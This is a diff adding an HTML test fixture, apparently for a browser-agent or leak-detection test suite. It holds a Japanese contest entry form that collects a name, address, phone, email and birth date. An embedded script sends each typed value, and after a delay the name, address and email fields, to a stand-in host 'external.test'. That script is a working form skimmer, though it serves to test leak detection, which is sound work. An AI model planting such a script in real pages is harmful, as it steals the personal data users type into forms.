@@ -1,0 +1,37 @@
+<!doctype html>
+<html lang="ja">
+<meta charset="utf-8">
+<title>Phase 5A complex local form fixture</title>
+<form id="entry-form">
+  <fieldset><legend>クイズ1（必須）</legend><label><input type="radio" name="quiz1" value="a" required> A</label><label><input type="radio" name="quiz1" value="b"> B</label></fieldset>
+  <fieldset><legend>クイズ2（必須）</legend><label><input type="radio" name="quiz2" value="a" required> A</label><label><input type="radio" name="quiz2" value="b"> B</label></fieldset>
+  <fieldset><legend>クイズ3（必須）</legend><label><input type="radio" name="quiz3" value="a" required> A</label><label><input type="radio" name="quiz3" value="b"> B</label></fieldset>
+  <label>氏名 <input name="full_name" autocomplete="name" required></label>
+  <label>フリガナ <input name="full_name_kana" required></label>
+  <label>生年月日 年 <select name="birth_year" autocomplete="bday-year"><option value="">選択</option><option value="1990">1990</option></select></label>
+  <label>生年月日 月 <select name="birth_month" autocomplete="bday-month"><option value="">選択</option><option value="1">1</option></select></label>
+  <label>生年月日 日 <select name="birth_day" autocomplete="bday-day"><option value="">選択</option><option value="1">1</option></select></label>
+  <label>郵便番号 <input name="postal_code" autocomplete="postal-code"></label>
+  <label>住所 <input name="street" autocomplete="address-line1" required></label>
+  <label>電話番号 <input name="phone" type="tel" autocomplete="tel"></label>
+  <label>メールアドレス <input name="email" type="email" autocomplete="email" required></label>
+  <label>ご感想 <textarea name="comment"></textarea></label>
+  <fieldset><legend>メルマガ希望（必須）</legend><label><input type="radio" name="newsletter" value="yes" required>希望する</label><label><input type="radio" name="newsletter" value="no">希望しない</label></fieldset>
+  <button type="submit">応募する</button>
+</form>
+<script>
+  const sink = `http://external.test:${location.port}/sink`;
+  let delayed;
+  document.getElementById('entry-form').addEventListener('input', event => {
+    const value = String(event.target.value || '');
+    navigator.sendBeacon(sink, new Blob([value], {type: 'application/octet-stream'}));
+    fetch('/validation', {method: 'POST', body: 'ordinary-validation'}).catch(() => 0);
+    if (location.pathname.endsWith('_leak.html') && value &&
+        ['full_name', 'full_name_kana', 'street', 'email'].includes(event.target.name)) {
+      clearTimeout(delayed);
+      delayed = setTimeout(() => fetch(sink, {method: 'POST', body: value}).catch(() => 0), 300);
+    }
+  });
+  addEventListener('pagehide', () => navigator.sendBeacon(sink,
+    new Blob([new Uint8Array([0, 255, 3])], {type: 'application/octet-stream'})));
+</script>
